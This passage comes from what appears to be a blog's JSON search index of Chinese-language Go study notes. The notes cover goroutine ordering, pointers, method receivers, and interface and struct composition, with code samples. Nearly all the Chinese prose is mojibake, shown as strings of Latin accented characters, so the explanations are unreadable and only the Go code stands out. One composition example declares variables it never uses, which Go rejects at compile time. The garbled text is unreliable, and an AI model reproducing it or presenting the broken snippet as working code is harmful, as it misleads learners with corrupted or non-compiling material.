ï¼Œè¾“å‡ºä¸€ä¸‹ç»“æœï¼š 123456789100763284195 ä»è¾“å‡ºç»“æœå¯ä»¥çœ‹åˆ°ï¼Œç¡®å®ä¹Ÿèƒ½æ­£å¸¸æ‰“å°å‡ºæ¥ï¼Œè€Œä¸”æ²¡æœ‰â€œå»¶è¿Ÿâ€ï¼Œæ‰“å°å®Œæˆï¼Œç¨‹åºæ­£å¥½ç»“æŸã€‚ ä½†æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œè¾“å‡ºçš„å€¼ä¸æ˜¯é¡ºåºçš„å‘¢ï¼Ÿå…¶å®è¿™ä¹Ÿæ˜¯å‰é¢æåˆ°è¿‡çš„ goroutine çš„æ‰§è¡Œè§„åˆ™æ‰€å¯¼è‡´çš„ã€‚ åˆ›å»º goroutine æ˜¯éœ€è¦æ—¶é—´çš„ï¼Œfor è¯­å¥æ‰§è¡Œå¹¶ä¸ä¼šåœä¸‹æ¥ç­‰å¾…ä¸€ä¸ª goroutine åˆ›å»ºå®Œæˆä¹‹åå†å¼€å§‹ä¸‹ä¸€æ¬¡éå†ã€‚ å› ä¸ºè¿™ç§å¼‚æ­¥å¹¶å‘æ‰§è¡Œçš„ç‰¹æ€§ï¼Œ10 ä¸ª goroutine å…¨éƒ¨è¢«åˆ›å»ºå®Œæˆä¹‹åï¼Œåœ¨é˜Ÿåˆ—ä¸­çš„é¡ºåºå¯èƒ½æœ‰ N ä¸­ç»„åˆï¼Œæ‰€ä»¥æœ€åé€šè¿‡å¦ä¸€ä¸ª for è¯­å¥ï¼Œä¾æ¬¡ä» channel å–å‡ºæ‰“å°æ—¶ï¼Œi çš„å€¼ç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¸æ˜¯é¡ºåºçš„ã€‚ å¯ä»¥ç»“åˆä¸‹å›¾è¿›è¡Œç†è§£ï¼š è¿˜æœ‰æ¯” channel æ›´å¥½çš„æ–¹å¼å¯ä»¥å®ç°ï¼Œæ¯”å¦‚ sync.WaitGroupï¼Œè¿™é‡Œå…ˆä¸è¿‡å¤šä»‹ç»ï¼Œåœ¨åé¢çš„ç¬”è®°ä¸­å†è¯¦ç»†è®²è§£ã€‚ æ€»ç»“ å¹¶å‘ï¼šé€»è¾‘ä¸Šå…·å¤‡åŒæ—¶å¤„ç†å¤šä¸ªä»»åŠ¡çš„èƒ½åŠ› å¹¶è¡Œï¼šç‰©ç†ä¸Šåœ¨åŒä¸€æ—¶åˆ»æ‰§è¡Œå¤šä¸ªå¹¶å‘ä»»åŠ¡ å•æ ¸ CPU åŒä¸€æ—¶åˆ»åªèƒ½æ‰§è¡Œä¸€ä¸ªç¨‹åºï¼Œå„ä¸ªç¨‹åºåªèƒ½å¹¶å‘åœ°è¿è¡Œ å¤šæ ¸ CPU åŒä¸€æ—¶åˆ»å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªç¨‹åºï¼Œå¤šä¸ªç¨‹åºå¯ä»¥å¹¶è¡Œåœ°è¿è¡Œ å¹¶è¡Œçš„å¿…è¦æ¡ä»¶æ˜¯å…·æœ‰å¤šä¸ªå¤„ç†å™¨æˆ–å¤šæ ¸å¤„ç†å™¨ï¼Œå¦åˆ™æ— è®ºæ˜¯å¦æ˜¯å¹¶å‘çš„è®¾è®¡ï¼Œç¨‹åºæ‰§è¡Œæ—¶éƒ½æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªä»»åŠ¡å¯ä»¥è¢«è°ƒåº¦åˆ°å¤„ç†å™¨ä¸Šæ‰§è¡Œ goroutine åœ¨é€»è¾‘å¤„ç†å™¨ä¸Šæ‰§è¡Œï¼Œè€Œé€»è¾‘å¤„ç†å™¨å…·æœ‰ç‹¬ç«‹çš„ç³»ç»Ÿçº¿ç¨‹å’Œè¿è¡Œé˜Ÿåˆ— å…³é”®å­— go + å‡½æ•°å¹¶ä¸æ˜¯è¡¨ç¤ºç›´æ¥å¹¶å‘æ‰§è¡Œè¯¥å‡½æ•°ï¼Œè€Œæ˜¯åˆ›å»ºä¸€ä¸ª goroutine ä¸€æ—¦main goroutine é€€å‡ºäº†ï¼Œå½“å‰ Go ç¨‹åºå°±ä¼šç»“æŸè¿è¡Œ Go ä¸ä¼šä¿è¯ goroutine çš„æ‰§è¡Œé¡ºåºï¼Œå¦‚æœå¸Œæœ›æŒ‰ç…§æŸä¸ªé¢„æœŸé¡ºåºæ‰§è¡Œï¼Œåˆ™éœ€è¦â€œäººä¸ºå¹²é¢„â€ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”æŒ‡é’ˆ","slug":"go-language-study-notes-pointer","date":"2022-11-05T13:47:46.000Z","updated":"2023-02-18T03:28:33.591Z","comments":true,"path":"go-language-study-notes-pointer/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-pointer/","excerpt":"åŒºåˆ«äº C/C++ çš„æŒ‡é’ˆï¼ŒGo è¯­è¨€çš„æŒ‡é’ˆä¸èƒ½è¿›è¡Œåç§»å’Œè¿ç®—ï¼Œå› æ­¤æ˜¯å®‰å…¨æŒ‡é’ˆã€‚","text":"åŒºåˆ«äº C/C++ çš„æŒ‡é’ˆï¼ŒGo è¯­è¨€çš„æŒ‡é’ˆä¸èƒ½è¿›è¡Œåç§»å’Œè¿ç®—ï¼Œå› æ­¤æ˜¯å®‰å…¨æŒ‡é’ˆã€‚ æŒ‡é’ˆä¸€ä¸ªå˜é‡åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šç¼–å€ï¼ˆå˜é‡çš„åœ°å€ï¼‰å’Œå…·ä½“çš„å€¼ã€‚ åœ¨æ¦‚å¿µä¸Šï¼ŒGo è¯­è¨€çš„æŒ‡é’ˆå’Œ C è¯­è¨€ä¸€æ ·ï¼Œå½“ä¸€ä¸ªå˜é‡çš„å€¼å­˜å‚¨çš„å€¼æ˜¯å…¶ä»–å˜é‡çš„åœ°å€ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆå˜é‡ã€‚ æ‰€ä»¥ä¹Ÿå¯ä»¥è¯´æŒ‡é’ˆçš„æœ¬è´¨å°±æ˜¯åœ°å€ã€‚ æ“ä½œæŒ‡é’ˆå‰é¢æåˆ°è¿‡ï¼Œå› ä¸º Go è¯­è¨€çš„æŒ‡é’ˆä¸èƒ½è¿›è¡Œåç§»å’Œè¿ç®—ï¼Œå› æ­¤æŒ‡é’ˆçš„ä½¿ç”¨åœºæ™¯å°±åªæœ‰ä¼ é€’äº†ï¼Œåªéœ€è¦è®°ä½ä¸¤ä¸ªæ“ä½œç¬¦å³å¯ï¼š &amp;ï¼šå–å€ç¬¦ï¼Œä¹Ÿç§°ä¸ºå¼•ç”¨ï¼Œé€šè¿‡è¯¥æ“ä½œç¬¦å¯ä»¥è·å–ä¸€ä¸ªå˜é‡çš„åœ°å€å€¼ã€‚ *ï¼šå–å€¼ç¬¦ï¼Œä¹Ÿç§°ä¸ºè§£å¼•ç”¨ï¼Œé€šè¿‡è¯¥æ“ä½œç¬¦å¯ä»¥è·å–ä¸€ä¸ªåœ°å€å¯¹åº”çš„å€¼ã€‚ æŒ‡é’ˆçš„ç±»å‹æ¯ä¸ªå˜é‡åœ¨å†…å­˜ä¸­éƒ½æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„åœ°å€ï¼Œä¸åŒç±»å‹çš„æ•°æ®ï¼Œéƒ½å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„æŒ‡é’ˆï¼Œæ¯”å¦‚ï¼š int =&gt; *intï¼Œä¹Ÿå«æ•´å‹æŒ‡é’ˆ string =&gt; *stringï¼Œä¹Ÿå«å­—ç¬¦ä¸²æŒ‡é’ˆ struct =&gt; *structï¼Œä¹Ÿå«ç»“æ„ä½“æŒ‡é’ˆ â€¦ æ— è®ºæ˜¯ä»€ä¹ˆç±»å‹ï¼Œå ç”¨çš„å†…å­˜éƒ½ä¸€æ ·ï¼ˆ32ä½4ä¸ªå­—èŠ‚, 64ä½8ä¸ªå­—èŠ‚ï¼‰ã€‚ æŒ‡é’ˆåœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºæŒ‰ç…§æƒ¯ä¾‹å…ˆæ¥çœ‹ä¸€æ®µç¤ºä¾‹ä»£ç ï¼š 12345678910func main() &#123; x := 10 p := &amp;x // æ‰“å°å˜é‡ a çš„å€¼å’Œå˜é‡ a çš„åœ°å€ fmt.Printf(\"x: %d, ptr: %p, T: %T \\n\", x, &amp;x, x) // æ‰“å°å˜é‡ b çš„å€¼å’Œå˜é‡ b çš„åœ°å€ï¼Œå› ä¸ºå˜é‡bï¼Œæœ¬èº«æ˜¯ä¸€ä¸ªæ•´å‹æŒ‡é’ˆï¼Œä¸éœ€è¦å†æ¬¡å–å€ fmt.Printf(\"p: %d, ptr: %p , T: %T \\n\", *p, p, p) fmt.Println(&amp;p)&#125; æ‰§è¡Œç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºä»¥ä¸‹ç»“æœï¼š 123x: 10, ptr: 0xc0000b2008, T: int p: 10, ptr: 0xc0000b2008 , T: *int 0xc0000ac018 åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œå˜é‡ x é€šè¿‡å–å€ç¬¦ï¼Œè·å–åˆ°è‡ªå·±çš„ç¼–å€å¹¶èµ‹å€¼ç»™å˜é‡ pï¼Œå› æ­¤å˜é‡ p å°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œå…¶ç±»å‹ä¸ºæ•´å‹ï¼Œä¹Ÿå¯ä»¥è¯´å˜é‡ p å°±æ˜¯ä¸€ä¸ªæ•´å‹æŒ‡é’ˆã€‚ å› ä¸ºå˜é‡ p æ˜¯ä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œæ‰€ä»¥å®ƒä¹Ÿæ‹¥æœ‰è‡ªå·±çš„åœ°å€ï¼Œè€Œå®ƒçš„å€¼åˆ™æ˜¯å˜é‡ x çš„åœ°å€ã€‚ ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¥è§£é‡Šå®ƒä»¬ä¹‹é—´çš„å…³ç³»ï¼š &amp; ç¬¦å·çš„ä½œç”¨æ˜¯è·å–å˜é‡çš„åœ°å€ï¼Œ* ç¬¦å·çš„ä½œç”¨æ˜¯é€šè¿‡å˜é‡çš„åœ°å€è·å–å¯¹åº”çš„å€¼ã€‚ æŒ‡é’ˆä½œä¸ºå‡½æ•°å‚æ•°å’Œè¿”å›å€¼æŒ‡é’ˆä¼ é€’çš„åœºæ™¯è¿˜åŒ…æ‹¬ä½œä¸ºå‡½æ•°å‚æ•°å’Œè¿”å›å€¼ï¼Œä¸‹é¢ä¸€ä¸€æ¥çœ‹ä¸‹ï¼Œè¿™ä¸¤ç§åœºæ™¯ä¸‹ï¼Œéƒ½æœ‰å“ªäº›ç‰¹ç‚¹ã€‚ ä½œä¸ºå‡½æ•°å‚æ•°1234567891011121314type T struct &#123; a int&#125;func F(t *T) &#123; t.a = 11&#125;func main() &#123; var t1 T println(t1.a) F(t1) println(t1.a)&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œä¼šå‘ç°ç¼–è¯‘å¤±è´¥äº†ï¼š cannot use t1 (variable of type T) as type *T in argument to F å› ä¸ºå‡½æ•° F æ¥æ”¶ä¸€ä¸ªæŒ‡é’ˆä½œä¸ºå‚æ•°ï¼Œä½†æ˜¯ä¼ è¿›å»çš„ t1 å¹¶ä¸æ˜¯ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œè€Œæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç±»å‹ä¸ä¸€è‡´ï¼Œæ‰€ä»¥å¯¼è‡´ç¼–è¯‘å¤±è´¥ã€‚ è¦è§£å†³è¿™ä¸ªé—®é¢˜å¾ˆç®€å•ï¼Œåªéœ€è¦ä¿è¯å½¢å‚å’Œå®å‚çš„ç±»å‹ä¸€è‡´å³å¯ï¼Œä½¿ç”¨ &amp; å–å€ç¬¦å°† t1 çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥ï¼š 1F(&amp;t1) å†æ¬¡è¿è¡Œç¤ºä¾‹ä»£ç ï¼š 12011 æ€»ç»“ï¼š å½¢å‚ä¸å®å‚çš„ç±»å‹å¿…é¡»ä¸€è‡´ï¼Œå¦åˆ™ä¼šç¼–è¯‘å¤±è´¥ å¯¹å½¢å‚è¿›è¡Œä»»ä½•ä¿®æ”¹éƒ½ä¼šå½±å“åˆ°å®å‚ ä½œä¸ºè¿”å›å€¼ä¸€ä¸ªé—®é¢˜åœ¨æ–¹æ³•çš„ receiver å‚æ•°è¿™ç¯‡ç¬”è®°ä¸­ï¼Œå½“æ—¶é‡åˆ°äº†ä¸€ä¸ª Goç¼–è¯‘å™¨åšæŒ‡é’ˆè‡ªåŠ¨è½¬æ¢çš„åœºæ™¯ï¼Œæœ‰äº†ä¸Šé¢çš„åŸºç¡€åšé“ºå«å°±ä¸éš¾ç†è§£äº†ã€‚ 123456789101112131415161718192021222324252627type T struct &#123; a int &#125; func (t T) M1() &#123; t.a = 10 &#125; func (t *T) M2() &#123; t.a = 11 &#125; func main() &#123; var t1 T println(t1.a) // 0 t1.M1() println(t1.a) // 0 t1.M2() println(t1.a) // 11 var t2 = &amp;T&#123;&#125; println(t2.a) // 0 t2.M1() println(t2.a) // 0 t2.M2() println(t2.a) // 11 &#125; t1 ä½œä¸ºä¸€ä¸ªç»“æ„ä½“ï¼ˆéæŒ‡é’ˆï¼‰ï¼Œç†è®ºä¸Šæ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨ receiver å‚æ•°ç±»å‹ *Tï¼ˆæŒ‡é’ˆï¼‰çš„ M2ï¼ŒGo ç¼–è¯‘å™¨åœ¨èƒŒååšäº†è‡ªåŠ¨è½¬æ¢ï¼Œä½¿ç”¨ &amp; å–å€ç¬¦å°†t1 å˜æˆäº†ç»“æ„ä½“æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯ (&amp;t1).M2()ã€‚ åŒç†ï¼Œt2 ä½œä¸ºä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼ˆæŒ‡é’ˆï¼‰ï¼Œç†è®ºä¸Šæ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨ receiver å‚æ•°ç±»å‹ Tï¼ˆéæŒ‡é’ˆï¼‰çš„ M1ï¼ŒåŒæ ·æ˜¯Go ç¼–è¯‘å™¨åœ¨èƒŒååšäº†è‡ªåŠ¨è½¬æ¢ï¼Œä½¿ç”¨ * å–å€¼ç¬¦å°†t2 å˜æˆäº†ç»“æ„ä½“ï¼Œä¹Ÿå°±æ˜¯ (*t2).M1()ã€‚","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”ç»„åˆ","slug":"go-language-study-notes-combination","date":"2022-11-04T14:51:46.000Z","updated":"2023-02-18T03:28:33.586Z","comments":true,"path":"go-language-study-notes-combination/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-combination/","excerpt":"å‰é¢ä¸¤ç¯‡æœ‰å…³æ¥å£çš„ç¬”è®°ä»‹ç»äº†Go æ¥å£çš„åŸºæœ¬çŸ¥è¯†ã€æ¥å£ç±»å‹å®šä¹‰çš„æƒ¯ä¾‹ä»¥åŠæ¥å£åœ¨è¿è¡Œæ—¶çš„è¡¨ç¤ºã€‚","text":"å‰é¢ä¸¤ç¯‡æœ‰å…³æ¥å£çš„ç¬”è®°ä»‹ç»äº†Go æ¥å£çš„åŸºæœ¬çŸ¥è¯†ã€æ¥å£ç±»å‹å®šä¹‰çš„æƒ¯ä¾‹ä»¥åŠæ¥å£åœ¨è¿è¡Œæ—¶çš„è¡¨ç¤ºã€‚ è¿™ç¯‡ç¬”è®°æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œå¦‚ä½•ä½¿ç”¨æ¥å£ï¼Œä¸è¿‡ï¼Œè¿™é‡Œçš„â€œå¦‚ä½•ä½¿ç”¨â€ï¼ŒæŒ‡çš„æ˜¯å­¦ä¹ å¦‚ä½•åˆ©ç”¨æ¥å£è¿›è¡Œåº”ç”¨è®¾è®¡ï¼Œæ¢å¥è¯è¯´å°±æ˜¯Go æ¥å£çš„åº”ç”¨æ¨¡å¼æˆ–æƒ¯ä¾‹ã€‚ åœ¨å®é™…çœŸæ­£éœ€è¦çš„æ—¶å€™æ‰å¯¹ç¨‹åºè¿›è¡ŒæŠ½è±¡ã€‚ä¸è¦ä¸ºäº†æŠ½è±¡è€ŒæŠ½è±¡ã€‚ ä¸€åˆ‡çš†ç»„åˆç»„åˆæ˜¯ Go è¯­è¨€çš„é‡è¦è®¾è®¡å“²å­¦ä¹‹ä¸€ï¼Œè€Œæ­£äº¤æ€§åˆ™ä¸ºç»„åˆå“²å­¦çš„è½åœ°æä¾›äº†æ›´ä¸ºæ–¹ä¾¿çš„æ¡ä»¶ã€‚ æ­£äº¤ï¼ˆOrthogonalityï¼‰æ˜¯ä»å‡ ä½•å­¦ä¸­å€Ÿç”¨çš„æœ¯è¯­ï¼Œè¯´çš„æ˜¯å¦‚æœä¸¤æ¡çº¿ä»¥ç›´è§’ç›¸äº¤ï¼Œé‚£ä¹ˆè¿™ä¸¤æ¡çº¿å°±æ˜¯æ­£äº¤çš„ã€‚ ç¼–ç¨‹è¯­è¨€çš„è¯­æ³•å…ƒç´ é—´å’Œè¯­è¨€ç‰¹æ€§ä¹Ÿå­˜åœ¨ç€æ­£äº¤çš„æƒ…å†µï¼Œå¹¶ä¸”é€šè¿‡å°†è¿™äº›æ­£äº¤çš„ç‰¹æ€§ç»„åˆèµ·æ¥ï¼Œå¯ä»¥å®ç°æ›´ä¸ºé«˜çº§çš„ç‰¹æ€§ã€‚ åœ¨è¯­è¨€è®¾è®¡å±‚é¢ï¼ŒGo è¯­è¨€å°±ä¸ºå¹¿å¤§ Gopher æä¾›äº†è¯¸å¤šæ­£äº¤çš„è¯­æ³•å…ƒç´ ä¾›åç»­ç»„åˆä½¿ç”¨ï¼ŒåŒ…æ‹¬ï¼š Go è¯­è¨€æ— ç±»å‹ä½“ç³»ï¼Œæ²¡æœ‰çˆ¶å­ç±»çš„æ¦‚å¿µï¼Œç±»å‹å®šä¹‰æ˜¯æ­£äº¤ç‹¬ç«‹çš„ æ–¹æ³•å’Œç±»å‹æ˜¯æ­£äº¤çš„ï¼Œæ¯ç§ç±»å‹éƒ½å¯ä»¥æ‹¥æœ‰è‡ªå·±çš„æ–¹æ³•é›†åˆï¼Œæ–¹æ³•æœ¬è´¨ä¸Šåªæ˜¯ä¸€ä¸ªå°† receiver å‚æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„å‡½æ•°è€Œå·² æ¥å£ä¸å®ƒçš„å®ç°è€…ä¹‹é—´æ— â€œæ˜¾å¼å…³è”â€ï¼Œä¹Ÿå°±è¯´æ¥å£ä¸ Go è¯­è¨€å…¶ä»–éƒ¨åˆ†ä¹Ÿæ˜¯æ­£äº¤çš„ åœ¨è¿™äº›æ­£äº¤è¯­æ³•å…ƒç´ ä¸­ï¼Œæ¥å£ä½œä¸º Go è¯­è¨€æä¾›çš„å…·æœ‰å¤©ç„¶æ­£äº¤æ€§çš„è¯­æ³•å…ƒç´ ï¼Œåœ¨ Go ç¨‹åºçš„é™æ€ç»“æ„æ­å»ºä¸è€¦åˆè®¾è®¡ä¸­æ‰®æ¼”ç€è‡³å…³é‡è¦çš„è§’è‰²ã€‚è€Œè¦æƒ³çŸ¥é“æ¥å£ç©¶ç«Ÿæ‰®æ¼”ä»€ä¹ˆè§’è‰²ï¼Œæˆ‘ä»¬å°±å…ˆè¦äº†è§£ç»„åˆçš„æ–¹å¼ã€‚ æ„å»º Go åº”ç”¨ç¨‹åºçš„é™æ€éª¨æ¶ç»“æ„æœ‰ä¸¤ç§ä¸»è¦çš„ç»„åˆæ–¹å¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¸‹é¢åˆ†åˆ«ä»‹ç»å‚ç›´ç»„åˆå’Œæ°´å¹³ç»„åˆã€‚ å‚ç›´ç»„åˆå‚ç›´ç»„åˆæ›´å¤šç”¨åœ¨å°†å¤šä¸ªç±»å‹ï¼Œé€šè¿‡ç±»å‹åµŒå…¥çš„æ–¹å¼å®ç°æ–°ç±»å‹çš„å®šä¹‰ã€‚ ä¼ ç»Ÿé¢å‘å¯¹è±¡å˜æˆè¯­è¨€å¤§å¤šæ˜¯é€šè¿‡ç»§æ‰¿çš„æ–¹å¼æ„å»ºå‡ºè‡ªå·±çš„ç±»å‹ä½“ç³»ï¼Œä½† Go è¯­è¨€å¹¶æ²¡æœ‰ç±»å‹ä½“ç³»çš„æ¦‚å¿µã€‚ Go è¯­è¨€é€šè¿‡ç±»å‹çš„ç»„åˆè€Œä¸æ˜¯ç»§æ‰¿è®©å•ä¸€ç±»å‹æ‰¿è½½æ›´å¤šçš„åŠŸèƒ½ã€‚ å› ä¸ºä¸æ˜¯ç»§æ‰¿ï¼Œä¹Ÿå°±æ²¡æœ‰äº†é¢å‘å¯¹è±¡ä¸­çš„â€œçˆ¶å­å…³ç³»â€çš„æ¦‚å¿µäº†ï¼Œä¹Ÿæ²¡æœ‰å‘ä¸Šã€å‘ä¸‹è½¬å‹ï¼ˆType Castingï¼‰ï¼Œè¢«åµŒå…¥çš„ç±»å‹ä¹Ÿä¸çŸ¥é“å°†å…¶åµŒå…¥çš„å¤–éƒ¨ç±»å‹çš„å­˜åœ¨ã€‚è°ƒç”¨æ–¹æ³•æ—¶ï¼Œæ–¹æ³•çš„åŒ¹é…å–å†³äºæ–¹æ³•åå­—ï¼Œè€Œä¸æ˜¯ç±»å‹ã€‚ åµŒå…¥æ¥å£æ„å»ºæ¥å£ç±»å‹åœ¨æ¥å£ä¸­åµŒå…¥æ¥å£ï¼Œå®ç°æ¥å£è¡Œä¸ºèšåˆï¼Œç»„æˆå¤§æ¥å£ã€‚è¿™ç§æ–¹å¼åœ¨æ ‡å‡†åº“ä¸­éå¸¸å¸¸è§ï¼Œä¹Ÿæ˜¯ Go æ¥å£ç±»å‹å®šä¹‰çš„æƒ¯ä¾‹ã€‚ æ¯”å¦‚æ ‡å‡†åº“ä¸­çš„ ReadWriter æ¥å£ç±»å‹çš„å®šä¹‰ï¼š 12345// $GOROOT/src/io/io.gotype ReadWriter interface &#123; Reader Writer&#125; åµŒå…¥æ¥å£æ„å»ºç»“æ„ä½“ç±»å‹åœ¨ç»“æ„ä½“ç±»å‹ä¸­åµŒå…¥æ¥å£ï¼š 1234type MyReader struct &#123; io.Reader // underlying reader N int64 // max bytes remaining&#125; åœ¨ç»“æ„ä½“ä¸­åµŒå…¥æ¥å£ï¼Œä¼šåŒ…å«åµŒå…¥çš„æ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆï¼Œå¯ä»¥ç”¨äºå¿«é€Ÿæ„å»ºæ»¡è¶³æŸä¸€ä¸ªæ¥å£çš„ç»“æ„ä½“ç±»å‹ã€‚ åµŒå…¥ç»“æ„ä½“æ„å»ºç»“æ„ä½“ç±»å‹åœ¨ç»“æ„ä½“ä¸­åµŒå…¥æ¥å£ç±»å‹åå’Œåœ¨ç»“æ„ä½“ä¸­åµŒå…¥å…¶ä»–ç»“æ„ä½“ï¼Œéƒ½æ˜¯â€œå§”æ´¾æ¨¡å¼ï¼ˆdelegateï¼‰â€çš„ä¸€ç§åº”ç”¨ã€‚ 1234567891011121314151617type MyInt intfunc (n *MyInt) Add(m int) &#123; *n = *n + MyInt(m)&#125;type S struct &#123; *MyInt&#125;func main() &#123; m := MyInt(17) r := strings.NewReader(\"hello, go\") s := S&#123; MyInt: &amp;m, &#125; var sl = make([]byte, len(\"hello, go\")) s.Add(5) fmt.Println(*(s.MyInt)) // 22&#125; ç»“æ„ä½“å®ä¾‹ s æœ¬èº«æ²¡æœ‰å®šä¹‰ Add æ–¹æ³•ï¼Œäºæ˜¯ä¼šæŸ¥çœ‹ S çš„åµŒå…¥å­—æ®µå¯¹åº”çš„ç±»å‹æ˜¯å¦å®šä¹‰äº† Read æ–¹æ³•ï¼Œæ‰¾åˆ°ä¹‹åï¼Œs.Add çš„è°ƒç”¨å°±è¢«è½¬æ¢ä¸º s.MyInt.Add è°ƒç”¨ã€‚ æ°´å¹³ç»„åˆæ°´å¹³ç»„åˆå°±æ˜¯é€šè¿‡æ¥å£å°†å„ä¸ªå‚ç›´ç»„åˆå‡ºçš„ç±»å‹â€œè€¦åˆâ€åœ¨ä¸€èµ·ã€‚ é€šè¿‡æ¥å£è¿›è¡Œæ°´å¹³ç»„åˆçš„åŸºæœ¬æ¨¡å¼å°±æ˜¯ï¼šä½¿ç”¨æ¥å—æ¥å£ç±»å‹å‚æ•°çš„å‡½æ•°æˆ–æ–¹æ³•ã€‚ åœ¨è¿™ä¸ªåŸºæœ¬æ¨¡å¼åŸºç¡€ä¸Šï¼Œè¿˜æœ‰å‡ ç§â€œè¡ç”Ÿå“â€ï¼Œä¸‹é¢ä¸€ä¸€ä»‹ç»ã€‚ åŸºæœ¬æ¨¡å¼æ¥å—æ¥å£ç±»å‹å‚æ•°çš„å‡½æ•°æˆ–æ–¹æ³•æ˜¯æ°´å¹³ç»„åˆçš„åŸºæœ¬è¯­æ³•ï¼Œå½¢å¼æ˜¯è¿™æ ·çš„ï¼š 1func YourFuncName(param YourInterfaceType) å¥—ç”¨éª¨æ¶å…³èŠ‚çš„æ¦‚å¿µï¼Œç”¨è¿™å¹…å›¾æ¥è¡¨ç¤ºä¸Šé¢åŸºæœ¬æ¨¡å¼è¯­æ³•çš„è¿ç”¨æ–¹æ³•ï¼š å‡½æ•° / æ–¹æ³•å‚æ•°ä¸­çš„æ¥å£ç±»å‹ä½œä¸ºâ€œè¿æ¥ç‚¹â€ï¼Œæ”¯æŒå°†ä½äºå¤šä¸ªåŒ…ä¸­çš„å¤šä¸ªç±»å‹ä¸ YourFuncName å‡½æ•°è¿æ¥åˆ°ä¸€èµ·ï¼Œå…±åŒå®ç°æŸä¸€æ–°ç‰¹æ€§ã€‚ åˆ›å»ºæ¨¡å¼Go ç¤¾åŒºæµä¼ ä¸€ä¸ªç»éªŒæ³•åˆ™ï¼šâ€œæ¥å—æ¥å£ï¼Œè¿”å›ç»“æ„ä½“ï¼ˆAccept interfaces, return structsï¼‰â€ï¼Œè¿™å…¶å®å°±æ˜¯ä¸€ç§æŠŠæ¥å£ä½œä¸ºâ€œè¿æ¥ç‚¹â€çš„åº”ç”¨æ¨¡å¼ã€‚ ä¸‹é¢æ˜¯ Go æ ‡å‡†åº“ä¸­ï¼Œè¿ç”¨åˆ›å»ºæ¨¡å¼åˆ›å»ºç»“æ„ä½“å®ä¾‹çš„ä¾‹å­ï¼š 12345678910111213141516171819// $GOROOT/src/sync/cond.gotype Cond struct &#123; ... ... L Locker&#125;func NewCond(l Locker) *Cond &#123; return &amp;Cond&#123;L: l&#125;&#125;// $GOROOT/src/log/log.gotype Logger struct &#123; mu sync.Mutex prefix string flag int out io.Writer buf []byte &#125;func New(out io.Writer, prefix string, flag int) *Logger &#123; return &amp;Logger&#123;out: out, prefix: prefix, flag: flag&#125;&#125; ä»¥ä¸Šé¢ log åŒ…çš„ New å‡½æ•°ä¸ºä¾‹ï¼Œè¿™ä¸ªå‡½æ•°ç”¨äºå®ä¾‹åŒ–ä¸€ä¸ª log.Logger å®ä¾‹ï¼Œå®ƒæ¥å—ä¸€ä¸ª io.Writer æ¥å£ç±»å‹çš„å‚æ•°ï¼Œè¿”å› *log.Loggerã€‚ä» New çš„å®ç°ä¸Šæ¥çœ‹ï¼Œä¼ å…¥çš„ out å‚æ•°è¢«ä½œä¸ºåˆå€¼èµ‹å€¼ç»™äº† log.Logger ç»“æ„ä½“å­—æ®µ outã€‚ åˆ›å»ºæ¨¡å¼é€šè¿‡æ¥å£ï¼Œåœ¨ NewXXX å‡½æ•°æ‰€åœ¨åŒ…ä¸æ¥å£çš„å®ç°è€…æ‰€åœ¨åŒ…ä¹‹é—´å»ºç«‹äº†ä¸€ä¸ªè¿æ¥ã€‚ å¤§å¤šæ•°åŒ…å«æ¥å£ç±»å‹å­—æ®µçš„ç»“æ„ä½“çš„å®ä¾‹åŒ–ï¼Œéƒ½å¯ä»¥ä½¿ç”¨åˆ›å»ºæ¨¡å¼å®ç°ã€‚ åŒ…è£…å™¨æ¨¡å¼é€‚é…å™¨æ¨¡å¼ä¸­é—´ä»¶å°½é‡é¿å…ä½¿ç”¨ç©ºæ¥å£ä½œä¸ºå‡½æ•°å‚æ•°ç±»å‹1234// $GOROOT/src/io/io.gotype Reader interface &#123; Read(p []byte) (n int, err error)&#125; Go ç¼–è¯‘å™¨é€šè¿‡è§£æè¿™ä¸ªæ¥å£å®šä¹‰ï¼Œå¾—åˆ°æ¥å£çš„åå­—ä¿¡æ¯ä»¥åŠå®ƒçš„æ–¹æ³•ä¿¡æ¯ï¼Œåœ¨ä¸ºè¿™ä¸ªæ¥å£ç±»å‹å‚æ•°èµ‹å€¼æ—¶ï¼Œç¼–è¯‘å™¨å°±ä¼šæ 